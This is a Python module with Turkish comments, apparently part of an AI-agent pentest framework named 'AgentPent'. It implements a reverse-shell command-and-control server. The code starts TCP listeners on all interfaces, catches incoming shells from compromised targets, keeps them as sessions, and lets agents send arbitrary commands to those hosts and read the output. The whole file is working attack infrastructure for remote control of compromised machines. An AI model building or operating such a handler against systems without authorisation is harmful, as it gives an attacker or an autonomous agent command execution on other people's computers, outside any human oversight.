"""AgentPent — Reverse Shell / C2 Handler.

Bir hedeften gelecek reverse shell (veya bind shell) bağlantılarını dinleyen,
aktif oturumları hafızada tutan ve ajanların asenkron komut göndermesini sağlayan merkezi C2 sunucusu.
"""

from __future__ import annotations

import asyncio
import logging
import uuid
from dataclasses import dataclass
from typing import Any, Dict, List, Optional

logger = logging.getLogger("agentpent.c2_server")

@dataclass
class ShellSession:
    """Aktif bir reverse shell oturumu."""
    session_id: str
    host: str
    port: int
    reader: asyncio.StreamReader
    writer: asyncio.StreamWriter
    connected_at: str

    async def execute(self, command: str, timeout: float = 30.0) -> str:
        """Oturuma komut gönder ve çıktısını oku."""
        if not command.endswith("\n"):
            command += "\n"
        
        try:
            self.writer.write(command.encode("utf-8"))
            await self.writer.drain()
            
            # Okuma için kısa bir süre bekle (Reverse shell'lerde EOF gelmeyeceği için chunk okumalıyız)
            # Timeout mekanizmasıyla ne kadar gelirse o kadar okuyacağız.
            output_bytes = b""
            
            async def read_chunk():
                return await self.reader.read(4096)
                
            try:
                while True:
                    # Sadece 1.5 saniye çıkış bekleyeceğiz (prompt shell'de takılı kalmasın diye)
                    chunk = await asyncio.wait_for(read_chunk(), timeout=1.5)
                    if not chunk:
                        break # EOF
                    output_bytes += chunk
            except asyncio.TimeoutError:
                # Veri akışı durdu, sorun yok (Reverse shell doğası gereği)
                pass
                
            out_str = output_bytes.decode("utf-8", errors="replace").strip()
            return out_str if out_str else "Komut başarıyla gönderildi (Çıktı dönmedi veya zaman aşımında kayboldu)."

        except Exception as exc:
            logger.error("[C2] Session %s komut hatası: %s", self.session_id, exc)
            return f"Error executing command: {exc}"

    def close(self):
        self.writer.close()


class C2Server:
    """Reverse Shell'leri kabul edip yöneten asenkron sunucu."""

    def __init__(self):
        self.sessions: Dict[str, ShellSession] = {}
        self.listeners: Dict[int, asyncio.Server] = {}

    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        """Yeni bir reverse shell bağlantısı geldiğinde çalışır."""
        addr = writer.get_extra_info('peername')
        if addr:
            host, port = addr[0], addr[1]
        else:
            host, port = "Unknown", 0
            
        session_id = str(uuid.uuid4())[:8]  # Kısa ID
        
        import datetime
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        session = ShellSession(session_id, host, port, reader, writer, now)
        self.sessions[session_id] = session
        
        logger.warning("🚨 [C2] YENI REVERSE SHELL BAĞLANTISI! Hedef: %s:%s (Session: %s)", host, port, session_id)
        
        # Ajanların veya orchestration'ın haberi olması için bir event bus / memory yazısı eklenebilir.
        # Basitçe açık tutacağız.
        try:
            # Oturumu açık tut ve EOF'yi dinle
            while True:
                # Sadece bağlantının kopup kopmadığını anlamak için minik okumalar yap
                # Gerçek okuma `execute` içerisinde yapılıyor ama asyncio stream reader queue'su var.
                # Eğer execute yapmıyorsak client kapattığında bilelim diye beklemeliyiz ama 
                # reader eşzamanlı kullanmak sıkıntı olabilir. Sadece await writer.wait_closed() bekleyelim:
                await asyncio.sleep(60) # Keep-alive tick
        except asyncio.CancelledError:
            pass
        except Exception as exc:
            logger.debug("[C2] Session %s kapandı: %s", session_id, exc)
        finally:
            self.remove_session(session_id)

    async def start_listener(self, port: int) -> bool:
        """Belirtilen portta bir TCP dinleyici başlatır."""
        if port in self.listeners:
            logger.warning("[C2] Port %d zaten dinleniyor.", port)
            return True
            
        try:
            # Bütün IP'lerden dinle
            server = await asyncio.start_server(self.handle_client, '0.0.0.0', port)
            self.listeners[port] = server
            logger.info("[C2] Listener başlatıldı: 0.0.0.0:%d", port)
            
            # Background task olarak döndür
            asyncio.create_task(server.serve_forever())
            return True
        except Exception as exc:
            logger.error("[C2] Listener başlatılamadı port %d: %s", port, exc)
            return False

    def stop_listener(self, port: int) -> bool:
        """Dinleyiciyi durdur."""
        if port in self.listeners:
            server = self.listeners[port]
            server.close()
            del self.listeners[port]
            logger.info("[C2] Listener kapatıldı: %d", port)
            return True
        return False

    def list_sessions(self) -> List[Dict[str, Any]]:
        """Açık oturumların listesini dön."""
        result = []
        for sid, sess in self.sessions.items():
            result.append({
                "session_id": sid,
                "host": sess.host,
                "connected_at": sess.connected_at
            })
        return result

    def get_session(self, session_id: str) -> Optional[ShellSession]:
        return self.sessions.get(session_id)

    def remove_session(self, session_id: str):
        if session_id in self.sessions:
            try:
                self.sessions[session_id].close()
            except:
                pass
            del self.sessions[session_id]
            logger.info("[C2] Session silindi: %s", session_id)


# Global Singleton for the C2
c2_manager = C2Server()
